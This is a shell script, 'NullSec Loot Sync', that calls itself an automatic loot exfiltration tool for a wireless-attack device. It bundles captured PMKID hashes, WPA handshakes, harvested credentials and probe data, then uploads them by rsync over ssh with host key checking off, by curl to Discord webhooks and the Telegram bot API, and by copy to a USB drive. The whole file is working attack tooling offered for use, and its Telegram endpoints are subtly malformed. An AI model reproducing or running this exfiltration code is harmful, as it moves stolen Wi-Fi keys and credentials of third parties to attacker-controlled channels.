#!/bin/sh
#===============================================================================
#  NULLSEC LOOT SYNC - Automatic Loot Exfiltration & Backup
#===============================================================================

LOOT_DIR="/mmc/nullsec"
BACKUP_DIR="/mmc/nullsec/backups"
LOG_FILE="/root/nullsec/logs/sync_$(date +%Y%m%d).log"

# Remote sync options (configure as needed)
REMOTE_SERVER="${REMOTE_SERVER:-}"
REMOTE_USER="${REMOTE_USER:-root}"
REMOTE_PATH="${REMOTE_PATH:-/loot/pager}"
DISCORD_WEBHOOK="${DISCORD_WEBHOOK:-}"
TELEGRAM_BOT="${TELEGRAM_BOT:-}"
TELEGRAM_CHAT="${TELEGRAM_CHAT:-}"

mkdir -p "$BACKUP_DIR" "$(dirname $LOG_FILE)"

log() { echo "[$(date '+%H:%M:%S')] $1" | tee -a "$LOG_FILE"; }

# Local backup
backup_local() {
    local backup_file="$BACKUP_DIR/loot_$(date +%Y%m%d_%H%M%S).tar.gz"
    
    log "Creating local backup..."
    
    tar czf "$backup_file" -C "$LOOT_DIR" . 2>/dev/null
    
    if [[ -f "$backup_file" ]]; then
        local size=$(du -h "$backup_file" | cut -f1)
        log "Backup created: $backup_file ($size)"
    else
        log "Backup failed!"
        return 1
    fi
}

# Sync to remote server via SSH/SCP
sync_ssh() {
    [[ -z "$REMOTE_SERVER" ]] && { log "REMOTE_SERVER not configured"; return 1; }
    
    log "Syncing to $REMOTE_USER@$REMOTE_SERVER:$REMOTE_PATH..."
    
    # Create remote directory
    ssh -o StrictHostKeyChecking=no "$REMOTE_USER@$REMOTE_SERVER" "mkdir -p $REMOTE_PATH"
    
    # Sync loot
    rsync -avz --progress "$LOOT_DIR/" "$REMOTE_USER@$REMOTE_SERVER:$REMOTE_PATH/" 2>&1 | tee -a "$LOG_FILE"
    
    log "SSH sync complete"
}

# Send to Discord webhook
sync_discord() {
    [[ -z "$DISCORD_WEBHOOK" ]] && { log "DISCORD_WEBHOOK not configured"; return 1; }
    
    log "Sending loot summary to Discord..."
    
    # Create summary
    local summary=$(cat << EOF
**🎯 NullSec Pager Loot Report**
\`\`\`
Timestamp: $(date)
Hostname:  $(cat /etc/hostname)

PMKID Hashes: $(cat "$LOOT_DIR/pmkid"/*.22000 2>/dev/null | wc -l)
Handshakes:   $(ls -1 "$LOOT_DIR/handshakes"/*.cap 2>/dev/null | wc -l)
Credentials:  $(cat "$LOOT_DIR/creds"/*.txt 2>/dev/null | wc -l)
Probe Data:   $(cat "$LOOT_DIR/probes"/*.txt 2>/dev/null | wc -l) entries

Top Networks:
$(cat "$LOOT_DIR/probes"/*.txt 2>/dev/null | awk -F'|' '{print $3}' | sort | uniq -c | sort -rn | head -5)
\`\`\`
EOF
)
    
    curl -H "Content-Type: application/json" \
         -d "{\"content\": \"$summary\"}" \
         "$DISCORD_WEBHOOK" 2>/dev/null
    
    # Send files if small enough
    for f in "$LOOT_DIR/creds"/*.txt "$LOOT_DIR/pmkid"/*.22000; do
        if [[ -f "$f" && $(stat -c%s "$f") -lt 8000000 ]]; then
            curl -F "file=@$f" "$DISCORD_WEBHOOK" 2>/dev/null
            log "Sent $f to Discord"
        fi
    done
    
    log "Discord sync complete"
}

# Send to Telegram
sync_telegram() {
    [[ -z "$TELEGRAM_BOT" || -z "$TELEGRAM_CHAT" ]] && { log "Telegram not configured"; return 1; }
    
    log "Sending to Telegram..."
    
    local summary="🎯 *NullSec Pager Report*
    
📅 $(date)
🖥️ $(cat /etc/hostname)

📊 *Loot Summary:*
• PMKID: $(cat "$LOOT_DIR/pmkid"/*.22000 2>/dev/null | wc -l) hashes
• Handshakes: $(ls -1 "$LOOT_DIR/handshakes"/*.cap 2>/dev/null | wc -l) files
• Creds: $(cat "$LOOT_DIR/creds"/*.txt 2>/dev/null | wc -l) entries"

    curl -s -X POST "https://api.telegram.org/botYOUR_BOT_TOKEN" \
        -d "chat_id=$TELEGRAM_CHAT" \
        -d "text=$summary" \
        -d "parse_mode=Markdown" 2>/dev/null
    
    # Send files
    for f in "$LOOT_DIR/creds"/*.txt "$LOOT_DIR/pmkid"/*.22000; do
        if [[ -f "$f" && $(stat -c%s "$f") -lt 50000000 ]]; then
            curl -s -F "chat_id=$TELEGRAM_CHAT" \
                 -F "document=@$f" \
                 "https://api.telegram.org/botYOUR_BOT_TOKEN" 2>/dev/null
        fi
    done
    
    log "Telegram sync complete"
}

# Sync to USB drive
sync_usb() {
    log "Syncing to USB drive..."
    
    # Find USB drive
    local usb=""
    for mnt in /mnt/usb* /media/*; do
        if mountpoint -q "$mnt" 2>/dev/null; then
            usb="$mnt"
            break
        fi
    done
    
    if [[ -z "$usb" ]]; then
        log "No USB drive found"
        return 1
    fi
    
    local dest="$usb/nullsec_loot_$(date +%Y%m%d)"
    mkdir -p "$dest"
    
    cp -rv "$LOOT_DIR"/* "$dest/" 2>&1 | tee -a "$LOG_FILE"
    
    sync
    log "USB sync complete: $dest"
}

# Auto sync (try all configured methods)
sync_all() {
    log "Starting auto-sync..."
    
    # Always do local backup
    backup_local
    
    # Try each remote method
    [[ -n "$REMOTE_SERVER" ]] && sync_ssh
    [[ -n "$DISCORD_WEBHOOK" ]] && sync_discord
    [[ -n "$TELEGRAM_BOT" ]] && sync_telegram
    
    # Try USB if present
    sync_usb 2>/dev/null
    
    log "Auto-sync complete"
}

# Show sync status
status() {
    echo "=== NULLSEC SYNC STATUS ==="
    echo ""
    echo "Loot directory: $LOOT_DIR"
    echo "Loot size: $(du -sh "$LOOT_DIR" 2>/dev/null | cut -f1)"
    echo ""
    echo "Backups: $(ls -1 "$BACKUP_DIR"/*.tar.gz 2>/dev/null | wc -l) files"
    echo "Latest:  $(ls -t "$BACKUP_DIR"/*.tar.gz 2>/dev/null | head -1)"
    echo ""
    echo "Configuration:"
    echo "  SSH:      ${REMOTE_SERVER:-NOT SET}"
    echo "  Discord:  ${DISCORD_WEBHOOK:+CONFIGURED}"
    echo "  Telegram: ${TELEGRAM_BOT:+CONFIGURED}"
}

case "${1:-status}" in
    backup) backup_local ;;
    ssh) sync_ssh ;;
    discord) sync_discord ;;
    telegram) sync_telegram ;;
    usb) sync_usb ;;
    all) sync_all ;;
    status) status ;;
    *)
        echo "NullSec Loot Sync"
        echo "Usage: $0 <command>"
        echo ""
        echo "Commands:"
        echo "  backup    - Create local backup"
        echo "  ssh       - Sync to remote server"
        echo "  discord   - Send to Discord webhook"
        echo "  telegram  - Send to Telegram"
        echo "  usb       - Sync to USB drive"
        echo "  all       - Auto sync all methods"
        echo "  status    - Show sync status"
        echo ""
        echo "Environment variables:"
        echo "  REMOTE_SERVER, REMOTE_USER, REMOTE_PATH"
        echo "  DISCORD_WEBHOOK"
        echo "  TELEGRAM_BOT, TELEGRAM_CHAT"
        ;;
esac
